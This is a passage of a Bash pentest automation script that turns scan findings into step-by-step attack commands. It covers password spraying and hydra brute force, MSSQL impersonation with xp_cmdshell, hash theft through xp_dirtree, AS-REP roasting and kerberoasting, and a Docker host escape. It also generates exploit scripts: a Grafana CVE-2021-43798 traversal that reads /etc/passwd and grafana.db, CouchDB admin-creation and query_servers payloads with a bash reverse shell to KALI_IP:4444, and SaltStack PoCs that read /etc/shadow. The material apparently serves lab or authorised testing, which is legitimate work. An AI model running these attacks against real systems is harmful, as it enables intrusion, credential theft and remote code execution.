            "PGPASSWORD=postgres psql -h $ip -p $pg_port -U postgres -c '\\l'" \
            "timeout 10m ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/wordlists/rockyou.txt" \
            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
    fi

    local zt_file
    zt_file=$(find "$target_dir/tcp/dns" -name 'zone_transfer_*.txt' -type f 2>/dev/null | head -1)
    if is_nonempty_file "$zt_file" && grep -q 'XFR size' "$zt_file" 2>/dev/null; then
        append_next_finding "$next_file" \
            "DNS zone transfer succeeded" \
            "$zt_file contains XFR size" \
            "cat $zt_file" \
            "awk '/^[^;]/ && \$4 ~ /^A$/ {print \$1}' $zt_file | sed 's/\\.\$//'" \
            "awk '/^[^;]/ && \$4 ~ /^A$/ {print \"$ip \" \$1}' $zt_file | sed 's/\\.\$//' | sudo tee -a /etc/hosts" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §DNS Follow-Up"
    else
        local dns_port
        dns_port=$(first_detected_port "$target_dir" 'domain|dns|^53/tcp')
        if [[ -n "$dns_port" ]]; then
            append_next_finding "$next_file" \
                "DNS detected" \
                "nmap service line includes port ${dns_port}" \
                "dig @$ip -p $dns_port version.bind chaos txt" \
                "dig @$ip -p $dns_port <DOMAIN> axfr" \
                "dnsrecon -d <DOMAIN> -n $ip" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §DNS Follow-Up"
        fi
    fi

    if is_nonempty_file "$target_dir/udp/snmp/process_args.txt" && \
       grep -qiE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' "$target_dir/udp/snmp/process_args.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "SNMP process arguments may contain secrets" \
            "$target_dir/udp/snmp/process_args.txt contains credential keywords" \
            "grep -iE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' $target_dir/udp/snmp/process_args.txt" \
            "cat $target_dir/udp/snmp/process_args.txt" \
            "grep -iE 'mysql|postgres|mssql|ssh|ftp|backup|script' $target_dir/udp/snmp/process_args.txt" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SNMP Follow-Up"
    fi

    if is_nonempty_file "$target_dir/udp/snmp/windows_users.txt"; then
        local snmp_users_loot="$target_dir/loot/snmp_windows_users.txt"
        grep -oP 'STRING:\s*\"?\K[^"]+' "$target_dir/udp/snmp/windows_users.txt" 2>/dev/null | sort -u > "$snmp_users_loot" || true
        if is_nonempty_file "$snmp_users_loot"; then
            append_next_finding "$next_file" \
                "Windows usernames found via SNMP" \
                "$snmp_users_loot is non-empty" \
                "cat $snmp_users_loot" \
                "./sprayr.sh -U $snmp_users_loot -p 'Password1' -t $ip" \
                "timeout 10m ./crackr.sh --hydra winrm --target $ip -U $snmp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra winrm --target $ip -U $snmp_users_loot -P /usr/share/wordlists/rockyou.txt" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.2 Password Spraying"
        fi
    fi

    local mssql_port
    mssql_port=$(first_detected_port "$target_dir" 'ms-sql|mssql|^1433/tcp')
    if [[ -n "$mssql_port" ]]; then
        local mssql_creds=""
        mssql_creds=$(grep -oP 'MSSQL LOGIN:\s*\K\S+' "$target_dir/loot/quick_wins.txt" 2>/dev/null | head -1)
        if [[ -n "$mssql_creds" ]]; then
            local mssql_user="${mssql_creds%%:*}"
            local mssql_pass="${mssql_creds#*:}"
            [[ "$mssql_pass" == "<empty>" || "$mssql_pass" == "$mssql_creds" ]] && mssql_pass=""
            append_next_finding "$next_file" \
                "MSSQL login succeeded" \
                "$target_dir/loot/quick_wins.txt contains MSSQL LOGIN" \
                "# Step 1 — baseline (version + direct sysadmin check):" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q 'SELECT @@version; SELECT IS_SRVROLEMEMBER(''sysadmin'');'" \
                "" \
                "# Step 2 — impersonation enum (most common low-priv-to-sysadmin path):" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';\"" \
                "" \
                "# DECIDE: column returns 'sa' → impersonate it and confirm sysadmin:" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT;\"" \
                "# DECIDE: column returns another principal → try that principal; chain until you land on one with sysadmin;" \
                "# DECIDE: column empty → check linked servers (step 3) or fall through to step 5 UNC-hash steal." \
                "" \
                "# Step 3 — linked server enum (second most common sysadmin-by-proxy path):" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q 'SELECT srvname, isremote FROM sys.servers;'" \
                "# DECIDE: linked servers returned → query via OPENQUERY, possibly as remote's login:" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"SELECT * FROM OPENQUERY([<LINKED_SRV>], 'SELECT @@version; SELECT IS_SRVROLEMEMBER(''sysadmin'');')\"" \
                "" \
                "# Step 4 — enable xp_cmdshell for RCE (requires sysadmin from step 1, 2, or 3):" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\"" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_cmdshell 'whoami'\"" \
                "" \
                "# Step 5 — steal NetNTLM hash via UNC path (any authenticated user, no sysadmin needed):" \
                "# Start Responder on Kali: sudo responder -I tun0 -wrf" \
                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_dirtree '\\\\\\\\<KALI_IP>\\\\share'\"" \
                "# Captured hash → hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt" \
                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
                "# TODO: vault has no §MSSQL-RCE — document xp_cmdshell enable, impersonation chain, linked servers, xp_dirtree relay"
        else
            append_next_finding "$next_file" \
                "MSSQL detected" \
                "nmap service line includes port ${mssql_port}" \
                "netexec mssql $ip -u <USER> -p '<PASS>'" \
                "impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@$ip' -windows-auth" \
                "impacket-mssqlclient '<USER>:<PASS>@$ip' -port $mssql_port" \
                "timeout 10m ./crackr.sh --hydra mssql --target $ip -U <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra mssql --target $ip -U <users.txt> -P /usr/share/wordlists/rockyou.txt" \
                "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip" \
                "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
        fi
    fi

    local rdp_port
    rdp_port=$(first_detected_port "$target_dir" 'ms-wbt-server|rdp|^3389/tcp')
    if [[ -n "$rdp_port" ]]; then
        append_next_finding "$next_file" \
            "RDP detected" \
            "nmap service line includes port ${rdp_port}" \
            "netexec rdp $ip -u <USER> -p '<PASS>'" \
            "xfreerdp /v:$ip:$rdp_port /u:<USER> /p:'<PASS>' /cert:ignore" \
            "nmap --script rdp-enum-encryption,rdp-ntlm-info -p $rdp_port $ip" \
            "# CHEAT: vault/_TOOLS/rdp.md"
    fi

    local kerberos_port
    kerberos_port=$(first_detected_port "$target_dir" 'kerberos|^88/tcp|^464/tcp')
    if [[ -n "$kerberos_port" ]]; then
        local ldap_users_file="$target_dir/loot/ldap_users.txt"
        if is_nonempty_file "$ldap_users_file"; then
            append_next_finding "$next_file" \
                "Kerberos + LDAP usernames available — AS-REP roast ready" \
                "Kerberos on port ${kerberos_port} and $ldap_users_file is non-empty" \
                "cat $ldap_users_file" \
                "# Extract domain from LDAP baseDN (replace <DOMAIN>):" \
                "grep -oP 'DC=\\K[^,]+' $target_dir/tcp/ldap/naming_contexts.txt | paste -sd. -" \
                "# Validate users with kerbrute:" \
                "kerbrute userenum --dc $ip -d <DOMAIN> $ldap_users_file" \
                "# AS-REP roast accounts with UF_DONT_REQUIRE_PREAUTH:" \
                "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile $ldap_users_file -no-pass -format hashcat -outputfile $target_dir/loot/asrep_hashes.txt" \
                "# Crack AS-REP hashes offline (hashcat mode 18200):" \
                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.3 AS-REP Roasting"
        else
            append_next_finding "$next_file" \
                "Kerberos detected" \
                "nmap service line includes port ${kerberos_port}" \
                "nmap --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' -p $kerberos_port $ip" \
                "" \
                "# Step 1 — extract domain from LDAP if present, else set manually:" \
                "grep -oP 'DC=\\K[^,]+' $target_dir/tcp/ldap/naming_contexts.txt 2>/dev/null | paste -sd. -" \
                "DOMAIN='<DOMAIN>'   # <-- set from step 1 output or known engagement hint" \
                "" \
                "# Step 2 — kerbrute fast pass with real-person names.txt (~10k names, ~2 min against a DC):" \
                "kerbrute userenum --dc $ip -d \"\$DOMAIN\" /usr/share/seclists/Usernames/Names/names.txt -o $target_dir/loot/kerbrute_raw.txt" \
                "grep -oP '(?<=VALID USERNAME:\\s)\\S+(?=@)' $target_dir/loot/kerbrute_raw.txt | sort -u > $target_dir/loot/kerbrute_users.txt" \
                "wc -l $target_dir/loot/kerbrute_users.txt   # count of valid usernames" \
                "" \
                "# DECIDE: kerbrute_users.txt has entries → skip step 3, jump to step 4 AS-REP roast;" \
                "# DECIDE: kerbrute returns no VALID USERNAME lines → users probably aren't real-person-named, fall through to step 3." \
                "" \
                "# Step 3 — broad-spectrum fallback (xato 8.3M list; ~30+ min on rate-limited DC, run in tmux):" \
                "kerbrute userenum --dc $ip -d \"\$DOMAIN\" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o $target_dir/loot/kerbrute_raw.txt" \
                "grep -oP '(?<=VALID USERNAME:\\s)\\S+(?=@)' $target_dir/loot/kerbrute_raw.txt | sort -u > $target_dir/loot/kerbrute_users.txt" \
                "" \
                "# Step 4 — AS-REP roast against the freshly enumerated users:" \
                "impacket-GetNPUsers \"\$DOMAIN/\" -dc-ip $ip -usersfile $target_dir/loot/kerbrute_users.txt -no-pass -format hashcat -outputfile $target_dir/loot/asrep_hashes.txt" \
                "# Step 5 — crack AS-REP hashes offline (hashcat mode 18200):" \
                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt" \
                "" \
                "# Parallel — kerberoast if you have ANY creds (from spray, leak, or AS-REP crack):" \
                "impacket-GetUserSPNs \"\$DOMAIN/<USER>:<PASS>\" -dc-ip $ip -request -outputfile $target_dir/loot/tgs_hashes.txt" \
                "hashcat -m 13100 $target_dir/loot/tgs_hashes.txt /usr/share/wordlists/rockyou.txt" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.4 Kerbrute User Enumeration" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.3 AS-REP Roasting" \
                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.4 Kerberoasting"
        fi
    fi

    if detected_tcp_port "$target_dir" "445" && [[ -n "$kerberos_port" || -n "$(first_detected_port "$target_dir" 'ldap|^389/tcp|^636/tcp|^3268/tcp')" ]]; then
        append_next_finding "$next_file" \
            "AD service combination detected" \
            "SMB plus Kerberos/LDAP appears in nmap results" \
            "netexec smb $ip" \
            "netexec smb $ip -u <USER> -p '<PASS>' --shares --users --groups" \
            "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip" \
            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1 Enumeration"
    fi

    local rsync_port
    rsync_port=$(first_detected_port "$target_dir" 'rsync|^873/tcp')
    if [[ -n "$rsync_port" ]]; then
        append_next_finding "$next_file" \
            "rsync detected" \
            "nmap service line includes port ${rsync_port}" \
            "rsync rsync://$ip:$rsync_port/" \
            "nmap --script rsync-list-modules -p $rsync_port $ip" \
            "rsync -av --timeout=30 rsync://$ip:$rsync_port/<MODULE>/ ./rsync_${ip//./_}_<MODULE>/" \
            "# TODO: vault has no §rsync — would cover module listing (rsync rsync://IP/), anonymous module fetch, writable-module upload for webshell drop"
    fi

    local vnc_port
    vnc_port=$(first_detected_port "$target_dir" 'vnc|^590[0-9]/tcp')
    if [[ -n "$vnc_port" ]]; then
        append_next_finding "$next_file" \
            "VNC detected" \
            "nmap service line includes port ${vnc_port}" \
            "nmap --script vnc-info,vnc-title,vnc-brute -p $vnc_port $ip" \
            "vncviewer $ip:$((vnc_port - 5900))" \
            "timeout 10m ./crackr.sh --hydra vnc --target $ip -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra vnc --target $ip -P /usr/share/wordlists/rockyou.txt" \
            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks" \
            "# TODO: vault has no §VNC — add vncviewer + vnc-brute workflow"
    fi

    local docker_port
    docker_port=$(first_detected_port "$target_dir" 'docker|^2375/tcp|^2376/tcp')
    if [[ -n "$docker_port" ]]; then
        append_next_finding "$next_file" \
            "Docker API detected" \
            "nmap service line includes port ${docker_port}" \
            "curl -s http://$ip:$docker_port/version | jq . 2>/dev/null || curl -s http://$ip:$docker_port/version" \
            "curl -s http://$ip:$docker_port/containers/json | jq . 2>/dev/null" \
            "docker -H tcp://$ip:$docker_port ps" \
            "docker -H tcp://$ip:$docker_port run --rm -it -v /:/host alpine chroot /host sh" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §Docker-API-escape — add chroot /host + container escape primitives"
    fi

    local kube_port
    kube_port=$(first_detected_port "$target_dir" 'kubernetes|^6443/tcp|^10250/tcp')
    if [[ -n "$kube_port" ]]; then
        append_next_finding "$next_file" \
            "Kubernetes API/kubelet detected" \
            "nmap service line includes port ${kube_port}" \
            "curl -sk https://$ip:$kube_port/version" \
            "curl -sk https://$ip:$kube_port/api/v1/pods" \
            "kubectl --server=https://$ip:$kube_port --insecure-skip-tls-verify get pods -A" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §Kubernetes — add kubelet /exec + /runningpods enumeration"
    fi

    local squid_port
    squid_port=$(first_detected_port "$target_dir" 'squid|proxy|^3128/tcp')
    if [[ -n "$squid_port" ]]; then
        append_next_finding "$next_file" \
            "HTTP proxy/Squid detected" \
            "nmap service line includes proxy/Squid or common proxy port ${squid_port}" \
            "curl -x http://$ip:$squid_port -I http://127.0.0.1/" \
            "curl -x http://$ip:$squid_port -I http://$ip/" \
            "proxychains -q nmap -sT -Pn -p80,443,8080 <INTERNAL_IP>" \
            "# CHEAT: vault/_CHEATSHEETS/Tunneling_Pivoting.md §Post-Pivot Action Chain (nearest match — discovered HTTP proxy = functional pivot)" \
            "# TODO: vault has no §Squid — would cover proxychains http-proxy config (http vs socks5 in /etc/proxychains4.conf), internal-host enumeration via target-side proxy"
    fi

    local tftp_udp=false tftp_tcp_port
    tftp_tcp_port=$(first_detected_port "$target_dir" 'tftp|^69/tcp')
    if grep -qP '^69/udp\s+open' "$target_dir/scans/nmap_udp.nmap" 2>/dev/null || [[ -n "$tftp_tcp_port" ]]; then
        tftp_udp=true
    fi
    if [[ "$tftp_udp" == "true" ]]; then
        append_next_finding "$next_file" \
            "TFTP detected" \
            "nmap UDP/TCP results indicate TFTP on port 69" \
            "nmap -sU --script tftp-enum -p69 $ip" \
            "tftp $ip -c get pxelinux.cfg/default" \
            "for f in config.txt backup.txt startup-config running-config; do tftp $ip -c get \$f; done" \
            "# TODO: vault has no §TFTP — would cover nmap tftp-enum, network-gear config filenames (pxelinux.cfg, startup-config, running-config), read+write semantics, PUT-to-webroot pivot"
    fi

    local legacy_port
    legacy_port=$(first_detected_port "$target_dir" 'rlogin|rexec|rsh|^512/tcp|^513/tcp|^514/tcp')
    if [[ -n "$legacy_port" ]]; then
        append_next_finding "$next_file" \
            "Legacy r-service detected" \
            "nmap service line includes rlogin/rexec/rsh or ports 512-514" \
            "nmap --script rusers,rlogin-brute -p $legacy_port $ip" \
            "rlogin -l <USER> $ip" \
            "rsh -l <USER> $ip id" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
    fi

    if is_nonempty_file "$target_dir/tcp/ssh/version_info.txt" && \
       grep -qi 'POTENTIALLY VULNERABLE SSH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        append_next_finding "$next_file" \
            "Potentially vulnerable SSH banner found" \
            "$target_dir/tcp/ssh/version_info.txt and quick_wins flag old SSH" \
            "cat $target_dir/tcp/ssh/version_info.txt" \
            "ssh-audit $ip" \
            "searchsploit \"$(head -1 "$target_dir/tcp/ssh/version_info.txt" 2>/dev/null | sed 's/^SSH Version: //')\"" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
    fi

    # --- Generic CMS / named-app fingerprint (one stanza, any app) ---
    # No per-CMS branching: we surface the name, dump evidence, and let searchsploit do the work.
    if grep -qi '^CMS/app fingerprint' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
        local cms_line cms_port cms_name
        while IFS= read -r cms_line; do
            cms_port=$(echo "$cms_line" | grep -oP ':\K[0-9]+' | head -1)
            cms_name=$(echo "$cms_line" | grep -oP '→\s*\K[^—]+' | awk '{$1=$1};1' | head -1)
            [[ -z "$cms_name" || -z "$cms_port" ]] && continue
            local proto="http"
            [[ "$cms_port" == "443" || "$cms_port" == "8443" ]] && proto="https"
            # cms_name looks like "Exhibitor", "Exhibitor (Jetty 1.0)" or
            # "nginx 1.14.2" after the fingerprint rewrite in generate_quick_wins.
            # Strip any parenthesized server detail so searchsploit gets the
            # most specific product term. Skip the stanza if nothing useful
            # survives — prevents junk queries like `searchsploit Error`.
            local cms_query
            cms_query=$(echo "$cms_name" | sed -E 's/\s*\([^)]*\)//g' | awk '{$1=$1};1')
            [[ -z "$cms_query" ]] && continue
            append_next_finding "$next_file" \
                "Named app on :${cms_port} — ${cms_name}" \
                "WhatWeb title/plugin on $ip:$cms_port ($target_dir/tcp/http/port_${cms_port}/whatweb.txt)" \
                "cat $target_dir/tcp/http/port_${cms_port}/whatweb.txt" \
                "searchsploit \"${cms_query}\"" \
                "curl -sk ${proto}://$ip:${cms_port}/ | grep -iE 'version|generator|<meta' | head -10" \
                "for p in /admin /admin/login /login /wp-admin /administrator /user/login /manager/html /console /api /robots.txt /.git/HEAD; do printf '%s %s\\n' \"\$(curl -sk -o /dev/null -w '%{http_code}' ${proto}://$ip:${cms_port}\$p)\" \"\$p\"; done" \
                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §3 Web / CMS Path"
        done < <(grep -i '^CMS/app fingerprint' "$target_dir/loot/quick_wins.txt" 2>/dev/null | sort -u)
    fi

    # --- Grafana :3000 — CVE-2021-43798 path traversal (v8.0.0–8.3.0) ---
    # Evidence-gated: port 3000 alone is ambiguous (React/Flask/Express dev
    # servers). Require a Grafana marker in whatweb/curl_headers. Stage the
    # probe + read scripts to $target_dir/loot/ per AGENTS.md §6 — the
    # path-traversal loop is exactly the payload shape that belongs in a file.
    local grafana_port_dir="$target_dir/tcp/http/port_3000"
    if detected_tcp_port "$target_dir" "3000" && [[ -d "$grafana_port_dir" ]] && \
        grep -qiE 'grafana|Grafana-[0-9]|grafana_session' \
            "$grafana_port_dir/whatweb.txt" "$grafana_port_dir/curl_headers.txt" 2>/dev/null; then
        local grafana_loot="$target_dir/loot"
        local grafana_probe="$grafana_loot/grafana_cve-2021-43798.probe.sh"
        local grafana_read="$grafana_loot/grafana_cve-2021-43798.read.sh"
        mkdir -p "$grafana_loot"
        cat > "$grafana_probe" <<GRAFANA_PROBE
#!/bin/bash
# CVE-2021-43798 Grafana path traversal probe
# Tries each Grafana plugin slug until /etc/passwd is read unauthenticated.
# Target baked in at script-generation: http://${ip}:3000
IP="${ip}"
for plug in alertlist annolist barchart bargauge cloudwatch dashlist elasticsearch graph heatmap histogram mysql opentsdb pluginlist postgres prometheus stat table text timeseries welcome; do
    out=\$(curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${plug}/../../../../../../../../etc/passwd")
    if echo "\$out" | grep -q '^root:'; then
        echo "VULN via plugin: \$plug"
        echo "\$out" | head -5
        exit 0
    fi
done
echo "No vulnerable plugin slug matched — target is likely >=8.3.1 (patched)."
exit 1
GRAFANA_PROBE
        chmod +x "$grafana_probe" 2>/dev/null || true
        cat > "$grafana_read" <<GRAFANA_READ
#!/bin/bash
# CVE-2021-43798 Grafana config + SQLite DB read (after probe confirms plugin)
# Usage: bash \$0 <VULN_PLUGIN>
PLUG="\${1:?Usage: \$0 <VULN_PLUGIN>}"
IP="${ip}"
OUT_DIR="$grafana_loot"
curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${PLUG}/../../../../../../../../etc/grafana/grafana.ini" -o "\${OUT_DIR}/grafana.ini"
curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${PLUG}/../../../../../../../../var/lib/grafana/grafana.db" -o "\${OUT_DIR}/grafana.db"
echo "Wrote: \${OUT_DIR}/grafana.ini  \${OUT_DIR}/grafana.db"
if command -v sqlite3 >/dev/null 2>&1 && [[ -s "\${OUT_DIR}/grafana.db" ]]; then
    echo "--- user table (crack bcrypt hashes with hashcat -m 3200) ---"
    sqlite3 "\${OUT_DIR}/grafana.db" 'SELECT login,password,salt FROM user;'
fi
GRAFANA_READ
        chmod +x "$grafana_read" 2>/dev/null || true
        append_next_finding "$next_file" \
            "Grafana detected on :3000" \
            "nmap shows :3000 open and $grafana_port_dir fingerprint matched Grafana marker; probe/read scripts staged at $grafana_loot/grafana_cve-2021-43798.*.sh" \
            "# Step 1 — fingerprint the version (CVE-2021-43798 affects 8.0.0 ≤ v ≤ 8.3.0):" \
            "curl -sk http://$ip:3000/api/health" \
            "curl -sk http://$ip:3000/login | grep -oE 'Grafana v[0-9.]+' | head -1" \
            "" \
            "# Step 2 — run the path-traversal probe (tries all standard plugin slugs):" \
            "bash $grafana_probe" \
            "" \
            "# DECIDE: probe prints 'VULN via plugin: <x>' → proceed to step 3 with that plugin name;" \
            "# DECIDE: probe prints 'No vulnerable plugin slug matched' → target patched, skip to step 4 brute;" \
            "# DECIDE: /api/health returns 401 or requires cookie → anonymous disabled, CVE-2021-43798 still works (no auth on /public/plugins/)." \
            "" \
            "# Step 3 — read grafana.ini + grafana.db, crack bcrypt admin hash offline (hashcat mode 3200):" \
            "bash $grafana_read <VULN_PLUGIN>" \
            "# hashcat -m 3200 <hash-file> /usr/share/wordlists/rockyou.txt" \
            "" \
            "# Step 4 — login brute fallback (default creds admin:admin first):" \
            "curl -sk -X POST http://$ip:3000/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"password\":\"admin\"}'" \
            "timeout 10m hydra -l admin -P /usr/share/wordlists/fasttrack.txt -s 3000 $ip http-post-form '/login:{\"user\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid username'" \
            "" \
            "searchsploit --cve CVE-2021-43798" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §Grafana — add the plugin-slug loop + grafana.db hashcat-3200 workflow"
    fi

    # --- CouchDB :5984 — CVE-2017-12635 admin create + CVE-2017-12636 query_servers RCE ---
    # Evidence-gated: port 5984 alone is ambiguous. Require a CouchDB marker
    # in a fingerprint file produced by enum_http on port 5984. Stage the two
    # exploit JSON bodies to files per AGENTS.md §6 — both are exploit-payload-shaped.
    local couchdb_port_dir="$target_dir/tcp/http/port_5984"
    if detected_tcp_port "$target_dir" "5984" && [[ -d "$couchdb_port_dir" ]] && \
        grep -qiE 'CouchDB|Apache CouchDB|"couchdb":"Welcome"' \
            "$couchdb_port_dir/whatweb.txt" "$couchdb_port_dir/curl_headers.txt" 2>/dev/null; then
        local couchdb_loot="$target_dir/loot"
        local couchdb_admin_body="$couchdb_loot/couchdb_cve-2017-12635.admin-create.json"
        local couchdb_rev_body="$couchdb_loot/couchdb_cve-2017-12636.revshell.json"
        mkdir -p "$couchdb_loot"
        cat > "$couchdb_admin_body" <<'COUCHDB_ADMIN'
{"type":"user","name":"pwn","roles":["_admin"],"roles":[],"password":"pwn"}
COUCHDB_ADMIN
        cat > "$couchdb_rev_body" <<'COUCHDB_REV'
"/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'"
COUCHDB_REV
        append_next_finding "$next_file" \
            "CouchDB detected on :5984" \
            "nmap shows :5984 open AND $couchdb_port_dir fingerprint matched CouchDB marker; exploit bodies staged at $couchdb_loot/couchdb_cve-*.json" \
            "# Step 0 — start reverse-shell listener on Kali BEFORE triggering step 3 (AGENTS.md §3 convention):" \
            "penelope -O -p 4444" \
            "# Edit $couchdb_rev_body and replace KALI_IP with your tun0 IP before step 3." \
            "" \
            "# Step 1 — fingerprint version (CVE-2017-12635 affects <1.7.0 and <2.1.1; CVE-2022-24706 needs Erlang port):" \
            "curl -sk http://$ip:5984/" \
            "curl -sk http://$ip:5984/_all_dbs              # admin-only on patched; open on unauth-misconfig" \
            "curl -sk http://$ip:5984/_node/_local/_config/admins  # lists admin users (401 on authed)" \
            "" \
            "# Step 2 — CVE-2017-12635 admin creation via duplicate-key JSON (no auth needed):" \
            "curl -sk -X PUT 'http://$ip:5984/_users/org.couchdb.user:pwn' -H 'Content-Type: application/json' --data @$couchdb_admin_body" \
            "" \
            "# DECIDE: response '{\"ok\":true,...}' with 201 Created → admin 'pwn:pwn' created, proceed to step 3;" \
            "# DECIDE: 400 Bad Request with 'duplicate field' → parser patched, pivot to default creds (admin:admin) or step 4 Erlang;" \
            "# DECIDE: 403 Forbidden → server admin party disabled or auth required, stop." \
            "" \
            "# Step 3 — CVE-2017-12636 authenticated RCE via query_servers config push (as new admin; step 0 listener must be up):" \
            "curl -sk -u pwn:pwn -X PUT 'http://$ip:5984/_node/_local/_config/query_servers/cmd' -H 'Content-Type: application/json' --data @$couchdb_rev_body" \
            "# Create a db and document with the language=cmd map function to trigger:" \
            "curl -sk -u pwn:pwn -X PUT 'http://$ip:5984/trigger'" \
            "curl -sk -u pwn:pwn -X POST 'http://$ip:5984/trigger' -H 'Content-Type: application/json' -d '{\"_id\":\"exp\",\"language\":\"cmd\",\"views\":{\"v\":{\"map\":\"function(){}\"}}}'" \
            "curl -sk -u pwn:pwn 'http://$ip:5984/trigger/_design/exp/_view/v'   # fires the query_server" \
            "" \
            "# DECIDE: query returns normally → shell should have landed on the Step 0 penelope listener;" \
            "# DECIDE: query returns 500 → view not invoking query_server, retry with _update handler instead of _view." \
            "" \
            "# Step 4 — CVE-2022-24706 default Erlang cookie (requires :4369 epmd + a random Erlang dist port):" \
            "nmap -sT -p 4369,9100-9200 $ip" \
            "# If :4369 open → epmd service discovery:" \
            "epmd -names -address $ip 2>/dev/null || nc -v $ip 4369" \
            "# Exploitation (erl required): erl -setcookie monster -remsh couchdb@<hostname> → :os.cmd('id') on remote node" \
            "" \
            "searchsploit --cve CVE-2017-12635" \
            "searchsploit --cve CVE-2022-24706" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §CouchDB — add duplicate-key admin create + query_servers RCE + Erlang-cookie chain"
    fi

    # --- SaltStack master (:4505/:4506) — CVE-2020-11651 + CVE-2020-11652 ---
    # Runs before the generic KB emitter so the operator reads the specific
    # handoff (manual PoC + msf fallback + decision tree) first. The generic
    # KB stanza for 4505/4506 that follows is low-noise residual.
    if detected_tcp_port "$target_dir" "4505" || detected_tcp_port "$target_dir" "4506"; then
        local salt_api_port="" _salt_candidate
        for _salt_candidate in 8000 8080 8443; do
            if detected_tcp_port "$target_dir" "$_salt_candidate"; then
                salt_api_port="$_salt_candidate"
                break
            fi
        done
        append_next_finding "$next_file" \
            "SaltStack master detected (:4505/:4506)" \
            "nmap_tcp.nmap shows SaltStack ZMTP ports — CVE-2020-11651 + CVE-2020-11652 candidate" \
            "# Step 1 — confirm master is reachable and unpatched:" \
            "nc -nv $ip 4506 </dev/null                      # connect → server hello OK" \
            "${salt_api_port:+curl -sk http://$ip:${salt_api_port}/login | head -20    # salt-api landing}" \
            "${salt_api_port:+curl -sk http://$ip:${salt_api_port}/run                 # POST endpoint used by exploit}" \
            "" \
            "# Step 2 — manual PoC (auth bypass → arbitrary salt-call as root):" \
            "git clone https://github.com/dozernz/cve-2020-11651 /tmp/salt_cve 2>/dev/null || true" \
            "# Alternative PoC if dozernz is down: github.com/jasperla/CVE-2020-11651-poc" \
            "python3 /tmp/salt_cve/exploit.py --master $ip --exec 'id'" \
            "python3 /tmp/salt_cve/exploit.py --master $ip --read-file /etc/shadow" \
